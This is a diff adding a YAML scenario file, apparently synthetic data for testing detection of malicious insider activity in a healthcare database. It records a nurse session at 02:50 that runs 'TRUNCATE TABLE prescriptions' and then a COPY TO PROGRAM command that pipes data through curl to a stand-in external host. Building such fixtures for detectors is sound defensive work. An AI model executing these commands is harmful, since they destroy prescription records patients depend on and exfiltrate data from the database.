@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_68_data_tamper_mal_1978
+family_id: gen_healthcare_68_data_tamper_mal_fam1978
+domain: healthcare
+time_of_day: 02:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE prescriptions
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.27.21.90
+      port: 8080
